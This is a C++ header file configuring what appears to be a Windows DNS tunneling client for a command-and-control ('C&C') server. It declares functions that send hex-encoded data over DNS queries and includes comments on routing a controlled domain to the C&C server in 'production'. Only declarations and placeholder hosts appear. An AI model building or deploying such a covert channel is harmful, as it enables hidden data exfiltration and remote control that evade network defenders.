#pragma once
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <windns.h>
#include <string>

// ==========================================
// DNS TUNNELING CONFIGURATION
// ==========================================

// DNS Query Options
constexpr DWORD DNS_OPTIONS = DNS_QUERY_BYPASS_CACHE | DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE;

// Target domain (your controlled domain)
inline std::string TARGET_DOMAIN = "example.com";

// ==========================================
// LOCAL TEST MODE
// ==========================================
// For local testing: Point directly to C&C server
inline const char* DNS_SERVER_IP = "127.0.0.1";  // Local C&C server IP

// ==========================================
// PRODUCTION MODE (Future - with DNS Resolver)
// ==========================================
// TODO: When deploying to production with DNS Resolver:
// 1. Setup DNS Resolver Server (BIND/Unbound/Custom)
// 2. Configure Resolver to forward queries for TARGET_DOMAIN to C&C Server
// 3. Uncomment and configure the options below:

    /* === OPTION 1: Use self-hosted DNS Resolver ===
    inline const char* DNS_SERVER_IP = "YOUR_DNS_RESOLVER_IP";  // e.g., 192.168.1.100

    // DNS Resolver will:
    // - Receive query from client
    // - If *.example.com → forward to C&C Server (Authoritative)
    // - Otherwise → forward to internet (1.1.1.1 or 8.8.8.8)

    // === OPTION 2: Use System DNS (not recommended for production) ===
    // Don't set DNS_SERVER_IP, let Windows use system DNS
    // But must configure domain registrar NS records correctly
    */

// ==========================================
// DNS TUNNELING FUNCTIONS
// ==========================================
int startConnection(const char* domain);
int sendData(int& id, int& packetNumber, const char* domain, const char* data);
std::string convertToHex(const char* string);
